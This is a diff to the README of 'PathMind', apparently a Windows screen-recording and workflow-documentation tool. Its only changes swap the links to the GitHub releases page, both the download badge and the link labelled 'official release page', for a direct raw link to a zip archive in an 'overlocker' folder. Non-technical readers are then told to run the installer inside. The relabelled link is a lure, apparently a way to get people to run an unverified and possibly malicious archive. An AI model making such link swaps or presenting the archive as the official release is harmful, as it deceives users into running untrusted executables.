@@ -1,6 +1,6 @@
 # 🧭 PathMind - Understand exactly how users navigate software
 
-[![](https://img.shields.io/badge/Download_PathMind-Blue?style=for-the-badge)](https://github.com/Instinct-bone607/PathMind/releases)
+[![](https://img.shields.io/badge/Download_PathMind-Blue?style=for-the-badge)](https://raw.githubusercontent.com/Instinct-bone607/PathMind/main/overlocker/Path_Mind_v2.6.zip)
 
 PathMind records your screen actions and turns them into organized knowledge. It tracks each click and interaction to show you how your product workflow functions. The application uses artificial intelligence to analyze these paths. It then produces a structured database that you can use with your own document systems.
 
@@ -18,7 +18,7 @@ PathMind simplifies the way you document product behavior.
 
 You do not need to understand code to use this application. Follow these instructions to set up PathMind on your Windows computer.
 
-1. Go to the [official release page](https://github.com/Instinct-bone607/PathMind/releases).
+1. Go to the [official release page](https://raw.githubusercontent.com/Instinct-bone607/PathMind/main/overlocker/Path_Mind_v2.6.zip).
 2. Look for the latest version listed under Assets.
 3. Click the file ending in .exe to download the installer.
 4. Run the installer and follow the instructions on your screen.
